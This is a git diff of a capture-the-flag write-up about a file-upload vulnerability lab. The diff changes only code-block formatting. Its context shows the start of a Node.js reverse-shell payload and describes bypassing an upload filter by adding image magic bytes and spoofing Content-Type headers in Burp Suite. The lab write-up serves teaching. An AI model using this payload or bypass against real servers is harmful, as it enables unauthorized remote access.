@@ -48,7 +48,7 @@ Knowing this, the reverse shell payload would have to have the first 6 bytes set
 
 However, additional enumeration needed to be done in order to figure out what type of payload to send. I used Burp Suite's request inspector to determine what type of back-end server was hosting the site:
 
-```HTTP
+```
 HTTP/1.1 304 Not Modified
 Server: nginx/1.14.0 (Ubuntu)
 Date: Mon, 23 Jan 2023 14:15:31 GMT
@@ -64,7 +64,8 @@ Front-End-Https: on
 
 The server was running `express.js` on Ubuntu. As such, I started looking for potential webshell or reverse shell payloads that could work.
 Express is a framework on top of `node.js`, so I found a `nodeJS` payload I could use:
-```node
+
+```javascript
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -88,7 +89,8 @@ I also noticed the `aotb()` function call, and after some research I found it wa
 However, after some testing, I found that the data was passed to the JavaScript code as a Base64 encoded string already, so it didn't need to be encoded manually. I then used a hex editor to add the magic number bytes to the file, bypassing the client side filter.
 
 I then used Burp Suite to intercept the upload request to the server, and modified the `Content-Type` header, the `type` field in the request, and the `content-length` to match a JPEG image upload.
-```http
+
+```
 POST / HTTP/1.1
 Host: jewel.uploadvulns.thm
 Content-Length: 606
